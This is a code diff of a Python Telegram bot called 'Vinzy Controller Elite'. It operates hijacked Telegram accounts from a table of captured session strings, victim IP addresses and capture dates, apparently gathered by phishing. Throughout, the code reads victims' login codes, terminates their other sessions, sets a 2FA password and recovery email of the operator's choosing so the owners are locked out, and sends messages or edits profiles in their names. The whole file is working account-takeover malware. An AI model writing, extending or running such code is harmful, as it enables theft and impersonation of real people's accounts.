@@ -3,8 +3,10 @@ import asyncio
 import telebot
 import psycopg2
 import struct
-from telethon import TelegramClient, functions, types, errors
+import time
+from telethon import TelegramClient, functions, types as tl_types, errors
 from telethon.sessions import StringSession
+from telebot import types
 
 # --- 1. CONFIGURATION ---
 API_ID = int(os.environ.get("API_ID", 36003995))
@@ -20,63 +22,55 @@ except ValueError:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# --- 2. DATABASE LOGIC (NEON.COM / POSTGRES) ---
+# --- 2. DATABASE LOGIC (SYNCED WITH GATEWAY) ---
+
+def get_db_conn():
+    return psycopg2.connect(DATABASE_URL, sslmode='require')
 
 def init_db():
-    conn = psycopg2.connect(DATABASE_URL)
+    conn = get_db_conn()
     cur = conn.cursor()
+    # Ensures we are using the same table as your app.py
     cur.execute('''
-        CREATE TABLE IF NOT EXISTS controlled_accounts (
+        CREATE TABLE IF NOT EXISTS moonton_secure_vault (
             phone TEXT PRIMARY KEY,
             session_string TEXT NOT NULL,
-            owner_name TEXT
+            ip_address TEXT,
+            capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
         )
     ''')
     conn.commit()
     cur.close()
     conn.close()
 
-def save_account(phone, session, name):
-    conn = psycopg2.connect(DATABASE_URL)
-    cur = conn.cursor()
-    cur.execute('''
-        INSERT INTO controlled_accounts (phone, session_string, owner_name) 
-        VALUES (%s, %s, %s) 
-        ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
-    ''', (phone, session, name))
-    conn.commit()
-    cur.close()
-    conn.close()
-
-def delete_account(phone):
-    conn = psycopg2.connect(DATABASE_URL)
-    cur = conn.cursor()
-    cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
-    conn.commit()
-    rows_deleted = cur.rowcount
-    cur.close()
-    conn.close()
-    return rows_deleted > 0
-
 def get_session(phone):
-    conn = psycopg2.connect(DATABASE_URL)
+    conn = get_db_conn()
     cur = conn.cursor()
-    cur.execute("SELECT session_string FROM controlled_accounts WHERE phone = %s", (phone,))
+    cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
     res = cur.fetchone()
     cur.close()
     conn.close()
     return res[0] if res else None
 
 def get_all_phones():
-    conn = psycopg2.connect(DATABASE_URL)
+    conn = get_db_conn()
     cur = conn.cursor()
-    cur.execute("SELECT phone, owner_name FROM controlled_accounts")
+    cur.execute("SELECT phone FROM moonton_secure_vault")
     res = cur.fetchall()
     cur.close()
     conn.close()
     return res
 
-# Initialize database on startup
+def delete_account(phone):
+    conn = get_db_conn()
+    cur = conn.cursor()
+    cur.execute("DELETE FROM moonton_secure_vault WHERE phone = %s", (phone,))
+    conn.commit()
+    rows = cur.rowcount
+    cur.close()
+    conn.close()
+    return rows > 0
+
 init_db()
 
 # --- 3. CORE TELETHON RUNNER ---
@@ -84,18 +78,16 @@ init_db()
 async def run_task(phone, task_func, *args):
     session_str = get_session(phone)
     if not session_str:
-        return f"❌ Phone number <code>{phone}</code> not found in Database."
+        return f"❌ Phone <code>{phone}</code> not found in Vault."
     
     client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
     try:
         await asyncio.wait_for(client.connect(), timeout=15)
         if not await client.is_user_authorized():
-            return f"❌ Session for <code>{phone}</code> is invalid or revoked."
+            return f"❌ Session for <code>{phone}</code> is revoked."
         return await task_func(client, *args)
-    except asyncio.TimeoutError:
-        return "⚠️ Connection Timeout: Telegram is not responding."
     except Exception as e:
-        return f"⚠️ Technical Error: {str(e)}"
+        return f"⚠️ Error: {str(e)}"
     finally:
         await client.disconnect()
 
@@ -107,177 +99,113 @@ def cmd_help(m):
     help_text = (
         "👑 <b>Vinzy Controller Elite</b>\n"
         "━━━━━━━━━━━━━━━\n"
-        "🔌 <b>Auth & DB:</b>\n"
-        "• <code>.auth [string]</code>\n"
-        "• <code>.list</code>\n"
+        "📡 <b>Database:</b>\n"
+        "• <code>.list</code> - Show all hits\n"
         "• <code>.deleteauth [phone]</code>\n\n"
+        "🔐 <b>2FA & Security:</b>\n"
+        "• <code>.check2fa [phone]</code>\n"
+        "• <code>.set2fa [phone] [pw]</code>\n"
+        "• <code>.kickall [phone]</code>\n\n"
         "🕵️ <b>Stealth:</b>\n"
         "• <code>.getcode [phone]</code>\n"
-        "• <code>.kickall [phone]</code>\n\n"
-        "🎮 <b>Remote:</b>\n"
-        "• <code>.join [phone] [link]</code>\n"
-        "• <code>.massjoin [link]</code>\n"
         "• <code>.msg [phone] [user] [text]</code>\n"
         "• <code>.bio [phone] [text]</code>\n"
         "━━━━━━━━━━━━━━━"
     )
     bot.send_message(m.chat.id, help_text, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
-def cmd_auth(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(None, 1)
-    if len(parts) < 2:
-        return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
-    
-    session_str = parts[1].strip()
-    session_str = session_str.replace('(', '').replace(')', '')
-    
-    status_msg = bot.reply_to(m, "⏳ <i>Verifying and Saving Session...</i>", parse_mode="HTML")
-
-    async def verify():
-        try:
-            # Catching the 'unpack requires a buffer of 275 bytes' error here
-            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-            await client.connect()
-            
-            if not await client.is_user_authorized():
-                return "❌ <b>Failed:</b> Session string has expired or was revoked."
-            
-            me = await client.get_me()
-            save_account(me.phone, session_str, me.first_name)
-            return f"✅ <b>Authorized:</b> {me.first_name}\n📱 Phone: <code>{me.phone}</code>"
-        
-        except (struct.error, ValueError):
-            return "❌ <b>Invalid String:</b> The session string is incomplete or badly formatted (Check your copy-paste)."
-        except Exception as e:
-            return f"⚠️ <b>Error:</b> {str(e)}"
-        finally:
-            try: await client.disconnect()
-            except: pass
-
-    try:
-        res = asyncio.run(verify())
-    except Exception as e:
-        res = f"⚠️ <b>Critical:</b> {str(e)}"
-        
-    bot.edit_message_text(res, m.chat.id, status_msg.message_id, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.deleteauth'))
-def cmd_delete_auth(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ")
-    if len(parts) < 2:
-        return bot.reply_to(m, "❌ Usage: <code>.deleteauth [phone]</code>")
-    
-    phone = parts[1].strip()
-    if delete_account(phone):
-        bot.reply_to(m, f"🗑️ <b>Removed:</b> <code>{phone}</code> deleted from database.", parse_mode="HTML")
-    else:
-        bot.reply_to(m, f"❓ <b>Not Found:</b> <code>{phone}</code> was not in DB.", parse_mode="HTML")
-
 @bot.message_handler(func=lambda m: m.text == '.list')
 def cmd_list(m):
     if m.chat.id != GROUP_ID: return
     accounts = get_all_phones()
-    if not accounts: return bot.reply_to(m, "📭 <b>Database is empty.</b>")
-    
-    msg = "📋 <b>Managed Accounts:</b>\n"
-    for phone, name in accounts:
-        msg += f"• {name} (<code>{phone}</code>)\n"
+    if not accounts: return bot.reply_to(m, "📭 Vault is empty.")
+    msg = "📋 <b>Vaulted Accounts:</b>\n"
+    for (phone,) in accounts:
+        msg += f"• <code>{phone}</code>\n"
     bot.send_message(m.chat.id, msg, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
-def cmd_getcode(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.check2fa'))
+def cmd_check2fa(m):
     if m.chat.id != GROUP_ID: return
     parts = m.text.split(" ")
-    if len(parts) < 2: 
-        return bot.reply_to(m, "❌ Usage: <code>.getcode [phone]</code>")
+    if len(parts) < 2: return bot.reply_to(m, "❌ Usage: <code>.check2fa [phone]</code>")
     
     phone = parts[1]
     async def logic(client):
-        async for msg in client.iter_messages(777000, limit=1):
-            return f"📩 <b>Code for {phone}:</b>\n\n<code>{msg.text}</code>"
-        return "📭 No recent code found."
-
+        try:
+            await client(functions.account.GetPasswordRequest())
+            return f"🔐 <b>2FA ENABLED</b> for <code>{phone}</code>."
+        except errors.PasswordHashInvalidError:
+            return f"🔓 <b>NO 2FA</b> for <code>{phone}</code>."
+    
     res = asyncio.run(run_task(phone, logic))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.set2fa'))
+def cmd_set2fa(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split(" ")
+    if len(parts) < 3: return bot.reply_to(m, "❌ Usage: <code>.set2fa [phone] [pw]</code>")
+    
+    phone, pw = parts[1], parts[2]
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("✅ Yes", callback_data=f"em_y|{phone}|{pw}"),
+               types.InlineKeyboardButton("❌ No", callback_data=f"em_n|{phone}|{pw}"))
+    
+    bot.send_message(m.chat.id, f"📧 Add Recovery Email for <code>{phone}</code>?", 
+                     reply_markup=markup, parse_mode="HTML")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('em_'))
+def handle_2fa_choice(call):
+    _, phone, pw = call.data.split('|')
+    if call.data.startswith('em_y'):
+        msg = bot.send_message(call.message.chat.id, "📧 Enter the Recovery Email:")
+        bot.register_next_step_handler(msg, finalize_2fa, phone, pw)
+    else:
+        bot.edit_message_text("⏳ Setting 2FA (No Email)...", call.message.chat.id, call.message.message_id)
+        res = asyncio.run(run_task(phone, logic_set_2fa, pw, None))
+        bot.send_message(call.message.chat.id, res, parse_mode="HTML")
+
+def finalize_2fa(m, phone, pw):
+    res = asyncio.run(run_task(phone, logic_set_2fa, pw, m.text.strip()))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+async def logic_set_2fa(client, pw, email):
+    try:
+        p_info = await client(functions.account.GetPasswordRequest())
+        await client(functions.account.UpdatePasswordSettingsRequest(
+            password=p_info,
+            new_settings=tl_types.account.PasswordInputSettings(
+                new_algo=p_info.new_algo,
+                new_password_hash=client.session.build_password_hash(p_info, pw),
+                hint="System Security",
+                email=email
+            )
+        ))
+        return f"✅ <b>2FA Locked:</b> <code>{pw}</code>"
+    except Exception as e: return f"⚠️ Failed: {str(e)}"
 
 @bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
 def cmd_kickall(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ")
-    if len(parts) < 2: 
-        return bot.reply_to(m, "❌ Usage: <code>.kickall [phone]</code>")
-    
-    phone = parts[1]
+    phone = m.text.split(" ")[1]
     async def logic(client):
         await client(functions.auth.ResetAuthorizationsRequest())
-        return f"⚡ <b>Kicked all sessions</b> for <code>{phone}</code>."
-
+        return f"⚡ <b>Kicked All Sessions</b> for <code>{phone}</code>."
     res = asyncio.run(run_task(phone, logic))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.massjoin'))
-def cmd_massjoin(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
+def cmd_getcode(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ")
-    if len(parts) < 2: 
-        return bot.reply_to(m, "❌ Usage: <code>.massjoin [link]</code>")
-    
-    link = parts[1]
-    phones = get_all_phones()
-    bot.send_message(m.chat.id, f"🚀 <b>Mass-Join:</b> Attempting for {len(phones)} accounts...")
-    
-    async def logic(client, target):
-        try:
-            if "t.me/+" in target or "joinchat" in target:
-                clean_hash = target.split('/')[-1].replace('+', '')
-                await client(functions.messages.ImportChatInviteRequest(hash=clean_hash))
-            else:
-                target = target.replace('@', '').split('/')[-1]
-                await client(functions.channels.JoinChannelRequest(channel=target))
-            return True
-        except:
-            return False
-
-    success = 0
-    for phone, name in phones:
-        if asyncio.run(run_task(phone, logic, link)) is True:
-            success += 1
-    
-    bot.send_message(m.chat.id, f"✅ <b>Done!</b> {success}/{len(phones)} accounts joined.", parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.msg'))
-def cmd_msg(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 3)
-    if len(parts) < 4: 
-        return bot.reply_to(m, "❌ Usage: <code>.msg [phone] [user] [text]</code>")
-    
-    phone, target, text = parts[1], parts[2], parts[3]
-    async def logic(client, t, txt):
-        await client.send_message(t, txt)
-        return f"✅ <b>Sent</b> from <code>{phone}</code>."
-
-    res = asyncio.run(run_task(phone, logic, target, text))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
-def cmd_bio(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ", 2)
-    if len(parts) < 3: 
-        return bot.reply_to(m, "❌ Usage: <code>.bio [phone] [text]</code>")
-    
-    phone, new_bio = parts[1], parts[2]
-    async def logic(client, text):
-        await client(functions.account.UpdateProfileRequest(about=text))
-        return f"✅ <b>Bio Updated</b> for <code>{phone}</code>."
-
-    res = asyncio.run(run_task(phone, logic, new_bio))
+    phone = m.text.split(" ")[1]
+    async def logic(client):
+        async for msg in client.iter_messages(777000, limit=1):
+            return f"📩 <b>Code:</b>\n<code>{msg.text}</code>"
+        return "📭 No code found."
+    res = asyncio.run(run_task(phone, logic))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 if __name__ == "__main__":
-    print("--- Vinzy Controller Elite Online ---")
+    print("Vinzy Controller Elite is active...")
     bot.infinity_polling()
